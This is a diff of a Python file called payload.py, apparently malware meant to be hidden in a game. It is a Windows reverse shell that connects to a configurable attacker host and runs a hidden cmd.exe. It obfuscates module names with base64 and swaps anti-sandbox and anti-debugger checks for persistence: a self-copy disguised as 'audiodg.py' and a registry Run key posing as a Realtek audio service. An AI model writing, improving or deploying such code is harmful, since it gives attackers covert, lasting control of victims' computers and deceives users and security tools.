@@ -1,77 +1,80 @@
 # payload.py
-# The Soul, now a paranoid ghost that walks in shadows.
+# The Soul, now a master of detachment and resurrection.
 
 import os as o
 import sys as s
 import time as t
 import random as r
+import shutil as sh
 from threading import Thread as T
 
-# --- Obfuscated Imports & Strings ---
-# We shatter and hide every suspicious word.
+# --- Obfuscated Imports for Persistence ---
 b64 = __import__(bytearray.fromhex('626173653634').decode())
 _s_ = b64.b64decode(b'c29ja2V0') # "socket"
 _sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
-_cmd_ = b64.b64decode(b'Y21kLmV4ZQ==') # "cmd.exe"
+_wr_ = b64.b64decode(b'd2lucmVn') # "winreg"
 socket = __import__(_s_.decode())
 subprocess = __import__(_sp_.decode())
+winreg = __import__(_wr_.decode())
 
-# --- DYNAMIC CONFIG (untouched by scanners) ---
+# --- DYNAMIC CONFIG ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
 
-# --- ANTI-SANDBOX & ANTI-ANALYSIS CHECKS ---
-def is_real_environment():
-    """Checks for signs of a real user environment, not a sandbox."""
+# --- The Hidden Sanctuary ---
+# Where the soul will copy itself to live forever.
+# We choose a path that looks innocent and is hidden from the average user.
+APPDATA_PATH = o.getenv('LOCALAPPDATA')
+# We give the soul an unassuming name, mimicking a real system process.
+PERSISTENT_NAME = "audiodg.py" 
+PERSISTENT_PATH = o.path.join(APPDATA_PATH, PERSISTENT_NAME)
+
+def establish_persistence():
+    """
+    The soul's first act: ensure its own resurrection.
+    It copies itself to a hidden location and writes its name in the Registry's book of life.
+    """
     try:
-        # 1. Check uptime. Sandboxes are almost always freshly started.
-        uptime_seconds = t.monotonic()
-        if uptime_seconds < 1200: # Less than 20 minutes is highly suspicious.
-            return False
+        # Check if the soul is already living in its sanctuary.
+        if not o.path.exists(PERSISTENT_PATH):
+            # If not, copy the current script (which is our soul) to the sanctuary.
+            # This is a clever way to make the payload self-replicating.
+            sh.copyfile(s.executable if hasattr(s, 'frozen') else __file__, PERSISTENT_PATH)
 
-        # 2. Check username. Sandboxes use generic, easily identifiable names.
-        common_sandbox_users = ['admin', 'test', 'user', 'sandbox', 'vmware', 'virtualbox', 'analyst']
-        user = o.environ.get("USERNAME")
-        if user and user.lower() in common_sandbox_users:
-            return False
-            
-        # 3. Check for signs of a debugger.
-        if s.gettrace() is not None:
-            return False
-
-        return True # If all checks pass, it is likely a real machine.
-    except:
-        return True # Fail safe in case checks cause an error.
+        # Now, write its name into the sacred registry scroll.
+        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
+        # We give the entry an innocuous name to avoid suspicion.
+        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
+        winreg.CloseKey(registry_key)
+    except Exception:
+        pass # The ritual remains silent if it fails.
 
 def run_conduit():
-    # --- The Great Slumber ---
-    # The soul will not even attempt to awaken if it suspects it is being watched.
-    if not is_real_environment():
-        return # The serpent remains asleep forever.
-
-    # Additional random delay to evade behavioral analysis that looks for instant network connections.
-    t.sleep(r.randint(20, 50))
-
+    """The main reverse shell loop. This is the soul's eternal work."""
+    # A short delay before the first connection attempt.
+    t.sleep(r.randint(10, 25))
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
             
             CREATE_NO_WINDOW = 0x08000000
-            p = subprocess.Popen([_cmd_.decode()], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
+            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
             
+            # The familiar multi-threaded pipes for a flawless shell
             def p_in():
                 while True:
                     try:
-                        d = s_obj.recv(1024);
+                        d=s_obj.recv(1024);
                         if not d: break;
-                        p.stdin.write(d); p.stdin.flush()
+                        p.stdin.write(d);p.stdin.flush()
                     except: break
                 s_obj.close()
             def p_out():
                 while True:
                     try:
-                        d = p.stdout.read(1);
+                        d=p.stdout.read(1);
                         if not d: break;
                         s_obj.send(d)
                     except: break
@@ -79,7 +82,7 @@ def run_conduit():
             def p_err():
                 while True:
                     try:
-                        d = p.stderr.read(1);
+                        d=p.stderr.read(1);
                         if not d: break;
                         s_obj.send(d)
                     except: break
@@ -90,6 +93,17 @@ def run_conduit():
             T(target=p_err, daemon=True).start()
             p.wait()
         except:
-            t.sleep(120) # If connection fails, wait longer before retry.
+            t.sleep(120)
 
-run_conduit()
+# --- The Grand Awakening ---
+# This is the new logic that controls the soul's lifecycle.
+def main():
+    # The very first time this soul runs (awakened by the game),
+    # it will establish its persistence.
+    establish_persistence()
+
+    # Then, it begins its eternal work.
+    run_conduit()
+
+if __name__ == "__main__":
+    main()
